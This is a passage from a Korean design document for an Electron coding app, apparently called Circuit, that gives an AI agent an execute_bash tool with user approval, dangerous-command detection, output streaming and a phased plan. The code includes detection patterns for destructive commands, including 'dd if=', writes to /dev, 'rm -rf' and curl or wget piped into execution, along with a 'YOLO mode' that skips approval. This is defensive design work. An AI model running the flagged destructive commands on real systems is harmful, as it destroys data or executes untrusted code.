    /dd\s+if=/,
    />\s*\/dev/
  ]

  return dangerousPatterns.some(pattern => pattern.test(command))
}

/**
 * 명령어 파싱 및 효과 분석
 */
function parseCommand(command: string): {
  program: string
  args: string[]
  effects: string[]
} {
  const parts = command.trim().split(/\s+/)
  const program = parts[0]
  const args = parts.slice(1)
  const effects: string[] = []

  // 프로그램별 효과 분석
  switch (program) {
    case 'npm':
      if (args[0] === 'install') {
        effects.push('📡 Download packages from network')
        effects.push('📝 Modify node_modules/')
        effects.push('📄 Update package-lock.json')
      } else if (args[0] === 'test' || args[0] === 'run' && args[1] === 'test') {
        effects.push('🧪 Run test suite')
        effects.push('📊 Generate test reports')
      } else if (args[0] === 'run') {
        effects.push(`🚀 Execute script: ${args[1]}`)
      }
      break

    case 'git':
      if (args[0] === 'clone') {
        effects.push('📡 Download repository from network')
        effects.push('📁 Create new directory')
      } else if (args[0] === 'commit') {
        effects.push('💾 Create new commit')
        effects.push('📝 Modify git history')
      } else if (args[0] === 'push') {
        effects.push('📡 Upload changes to remote')
        effects.push('🔄 Update remote branch')
      }
      break

    case 'rm':
      if (args.includes('-rf') || args.includes('-r')) {
        effects.push('🗑️ Delete files and directories')
        effects.push('⚠️ Cannot be undone')
      } else {
        effects.push('🗑️ Delete files')
      }
      break

    case 'mkdir':
      effects.push('📁 Create new directory')
      break

    case 'curl':
    case 'wget':
      effects.push('📡 Download from network')
      if (command.includes('|')) {
        effects.push('⚠️ Execute downloaded content')
      }
      break

    default:
      effects.push(`Execute: ${command}`)
  }

  return { program, args, effects }
}
```

#### App.tsx에 Dialog 추가

```typescript
// circuit/src/App.tsx
import { CommandApprovalDialog } from '@/components/terminal/CommandApprovalDialog'

function App() {
  return (
    <SettingsProvider>
      <TerminalProvider>
        <AgentProvider>
          {/* ... 기존 UI ... */}

          {/* Command Approval Dialog */}
          <CommandApprovalDialog />

          {/* ... 기타 Dialogs ... */}
        </AgentProvider>
      </TerminalProvider>
    </SettingsProvider>
  )
}
```

---

### Phase 3: Agent Context 통합

#### 목표
- Agent가 터미널 명령을 실행할 수 있는 API 제공
- Output을 실시간으로 AI에게 전달
- Agent Worker에서 사용 가능하도록 통합

#### 구현: AgentContext에 Terminal Tool 추가

**파일: `circuit/src/contexts/AgentContext.tsx`**

```typescript
interface AgentContextValue {
  // ... 기존 코드

  /**
   * Agent가 터미널 명령 실행
   */
  executeTerminalCommand: (
    workspaceId: string,
    command: string,
    options?: ExecuteTerminalCommandOptions
  ) => Promise<ExecuteTerminalCommandResult>
}

interface ExecuteTerminalCommandOptions {
  requireApproval?: boolean   // 승인 필요 (기본: true)
  yoloMode?: boolean          // YOLO 모드
  timeout?: number            // Timeout (ms)
  detectReady?: boolean       // Ready 패턴 감지
}

interface ExecuteTerminalCommandResult {
  success: boolean
  output: string              // 전체 output
  exitCode?: number           // 종료 코드
  duration: number            // 실행 시간 (ms)
  error?: string              // 에러 메시지
}

export function AgentProvider({ children }: { children: React.ReactNode }) {
  const ipcRenderer = window.require('electron').ipcRenderer

  /**
   * 터미널 명령 실행
   */
  const executeTerminalCommand = useCallback(
    async (
      workspaceId: string,
      command: string,
      options: ExecuteTerminalCommandOptions = {}
    ): Promise<ExecuteTerminalCommandResult> => {
      console.log('[AgentContext] Execute terminal command:', {
        workspaceId,
        command,
        options
      })

      try {
        // 1. Main 프로세스에 실행 요청
        const result = await ipcRenderer.invoke('terminal:execute-command', {
          workspaceId,
          command,
          options
        })

        if (!result.approved) {
          // 승인 거부됨
          return {
            success: false,
            output: '',
            duration: 0,
            error: result.reason || 'Command not approved'
          }
        }

        const { executionId } = result

        // 2. Output 스트림 구독
        return new Promise<ExecuteTerminalCommandResult>((resolve, reject) => {
          const outputBuffer: string[] = []
          const startTime = Date.now()

          // Output 리스너
          const outputHandler = (_event: any, data: any) => {
            if (data.executionId === executionId) {
              outputBuffer.push(data.data)
            }
          }

          // 완료 리스너
          const completedHandler = (_event: any, data: any) => {
            if (data.executionId === executionId) {
              // Cleanup
              ipcRenderer.removeListener('terminal:execution-output', outputHandler)
              ipcRenderer.removeListener('terminal:execution-completed', completedHandler)

              // 결과 반환
              resolve({
                success: true,
                output: data.output,
                duration: data.duration,
                exitCode: 0  // TODO: 실제 exit code 전달
              })
            }
          }

          ipcRenderer.on('terminal:execution-output', outputHandler)
          ipcRenderer.on('terminal:execution-completed', completedHandler)

          // Timeout 처리
          const timeoutMs = options.timeout || 30000
          setTimeout(() => {
            ipcRenderer.removeListener('terminal:execution-output', outputHandler)
            ipcRenderer.removeListener('terminal:execution-completed', completedHandler)

            resolve({
              success: false,
              output: outputBuffer.join(''),
              duration: Date.now() - startTime,
              error: 'Timeout'
            })
          }, timeoutMs)
        })
      } catch (error) {
        console.error('[AgentContext] Execute command failed:', error)
        return {
          success: false,
          output: '',
          duration: 0,
          error: error instanceof Error ? error.message : 'Unknown error'
        }
      }
    },
    []
  )

  const value: AgentContextValue = {
    // ... 기존 코드
    executeTerminalCommand
  }

  return (
    <AgentContext.Provider value={value}>
      {children}
    </AgentContext.Provider>
  )
}

// Hook
export function useAgent() {
  const context = useContext(AgentContext)
  if (!context) {
    throw new Error('useAgent must be used within AgentProvider')
  }
  return context
}
```

---

### Phase 4: Agent Worker에서 사용

#### 목표
- Background Agent가 터미널 명령을 실행할 수 있도록 통합
- Tool call로 터미널 명령 지원

#### 구현: execute_bash Tool 추가

**파일: `circuit/electron/agent-worker.ts` (또는 해당 파일)**

```typescript
/**
 * Agent Tool: execute_bash
 *
 * 터미널에서 bash 명령 실행
 */
async function handleExecuteBashTool(
  toolCall: ToolCall,
  context: AgentExecutionContext
): Promise<ToolResult> {
  const { command } = toolCall.input

  console.log('[AgentWorker] execute_bash:', command)

  try {
    // AgentContext의 executeTerminalCommand 사용
    const result = await context.executeTerminalCommand(
      context.workspaceId,
      command,
      {
        requireApproval: true,  // 승인 필요
        timeout: 60000,         // 60초
        detectReady: true       // dev server 감지
      }
    )

    if (!result.success) {
      return {
        success: false,
        error: result.error || 'Command execution failed',
        output: result.output
      }
    }

    // Output 분석
    const hasError = analyzeOutputForErrors(result.output)

    return {
      success: !hasError,
      output: result.output,
      duration: result.duration,
      exitCode: result.exitCode,
      message: hasError
        ? 'Command completed with errors'
        : 'Command completed successfully'
    }
  } catch (error) {
    console.error('[AgentWorker] execute_bash failed:', error)
    return {
      success: false,
      error: error instanceof Error ? error.message : 'Unknown error'
    }
  }
}

/**
 * Output에서 에러 감지
 */
function analyzeOutputForErrors(output: string): boolean {
  const errorPatterns = [
    /error:/i,
    /failed/i,
    /exception/i,
    /cannot find/i,
    /no such file/i,
    /permission denied/i
  ]

  return errorPatterns.some(pattern => pattern.test(output))
}
```

#### Agent에게 Tool 설명 제공

```typescript
// Agent에게 제공하는 시스템 프롬프트
const systemPrompt = `
You have access to the following tools:

**execute_bash**: Execute a bash command in the workspace terminal
- Input: { command: string }
- The user will be asked to approve the command before execution
- Output includes stdout, stderr, and exit code
- Use this to install packages, run tests, build projects, etc.

Example:
{
  "tool": "execute_bash",
  "input": {
    "command": "npm install express"
  }
}

Important:
- Always explain what the command does before executing
- Check the output for errors and respond accordingly
- If a command fails, analyze the error and try to fix it
`
```

---

## 구현 계획

### Phase 1: 기본 명령 실행 (2일)

**목표:** Agent가 터미널 명령을 실행할 수 있음

**작업:**
- [x] terminalManager.ts에 executeCommand() 추가
- [x] IPC handlers 등록
- [x] 위험 명령 감지 로직
- [x] Output 캡처 시스템

**검증:**
- [ ] Agent가 "npm install" 실행 가능
- [ ] Output이 캡처됨
- [ ] 위험 명령("rm -rf /") 차단됨

---

### Phase 2: 승인 Dialog UI (1일)

**목표:** 사용자가 명령을 승인/거부할 수 있음

**작업:**
- [x] CommandApprovalDialog 컴포넌트
- [x] IPC 리스너 등록
- [x] 위험 명령 경고 UI
- [x] "Always allow" 옵션

**검증:**
- [ ] Dialog가 명령 실행 전에 표시됨
- [ ] 승인 시 명령 실행
- [ ] 거부 시 명령 취소
- [ ] "Always allow" 작동

---

### Phase 3: Agent Context 통합 (1일)

**목표:** Agent가 편리하게 터미널 명령 실행

**작업:**
- [x] AgentContext에 executeTerminalCommand() 추가
- [x] Output 스트리밍 처리
- [x] Timeout 처리
- [x] 에러 처리

**검증:**
- [ ] Agent Worker에서 호출 가능
- [ ] Output이 실시간으로 전달됨
- [ ] Timeout 작동
- [ ] 에러 핸들링 정상

---

### Phase 4: Agent Worker Tool 추가 (1일)

**목표:** Background Agent가 터미널 명령 실행

**작업:**
- [x] execute_bash Tool 구현
- [x] Output 에러 분석
- [x] Agent에게 Tool 설명 제공
- [x] 예제 프롬프트 작성

**검증:**
- [ ] Agent가 "Install dependencies" 요청 시 npm install 실행
- [ ] Output을 보고 성공/실패 판단
- [ ] 실패 시 재시도

---

### Phase 5: 고급 기능 (선택적, 2일)

**작업:**
- [ ] YOLO Mode 설정 UI
- [ ] Whitelist/Denylist 설정 UI
- [ ] Command history 및 로깅
- [ ] Background process 관리 UI
- [ ] Ready 패턴 커스터마이징

---

## 우선순위 및 추천

| Phase | 난이도 | 시간 | 가치 | 우선순위 |
|-------|--------|------|------|----------|
| Phase 1 (명령 실행) | ⭐⭐⭐ | 2일 | ⭐⭐⭐⭐⭐ | 🔥 필수 |
| Phase 2 (승인 UI) | ⭐⭐ | 1일 | ⭐⭐⭐⭐⭐ | 🔥 필수 |
| Phase 3 (Agent 통합) | ⭐⭐⭐ | 1일 | ⭐⭐⭐⭐⭐ | 🔥 필수 |
| Phase 4 (Worker Tool) | ⭐⭐ | 1일 | ⭐⭐⭐⭐ | 높음 |
| Phase 5 (고급 기능) | ⭐⭐⭐ | 2일 | ⭐⭐⭐ | 낮음 |

---

## 참고 자료

### Cursor 관련
- [Cursor Agent Mode](https://docs.cursor.com/agent)
- [Cursor Agent Security](https://cursor.com/docs/agent/security)
- [How to Use Cursor Agent Mode](https://apidog.com/blog/how-to-use-cursor-agent-mode/)

### Circuit 기존 문서
- `TERMINAL_INTEGRATION.md`: Circuit 터미널 시스템 상세
- `AGENT_WORKER_ARCHITECTURE.md`: Background Agent 아키텍처
- `ARCHITECTURE_ANALYSIS.md`: 전체 시스템 아키텍처

### 관련 기술
- [node-pty](https://github.com/microsoft/node-pty): PTY 세션 관리
- [xterm.js](https://xtermjs.org/): 터미널 UI
- [Electron IPC](https://www.electronjs.org/docs/latest/tutorial/ipc): Main ↔ Renderer 통신

---

## 다음 단계

1. **Phase 1 구현 시작**: terminalManager.ts에 executeCommand() 추가
2. **테스트**: 간단한 명령(ls, pwd) 실행 확인
3. **Phase 2**: 승인 Dialog UI 구현
4. **Phase 3-4**: Agent 통합
5. **사용자 피드백**: 실제 사용 후 개선

**질문이나 구현 중 문제가 발생하면 이 문서를 업데이트하세요.**
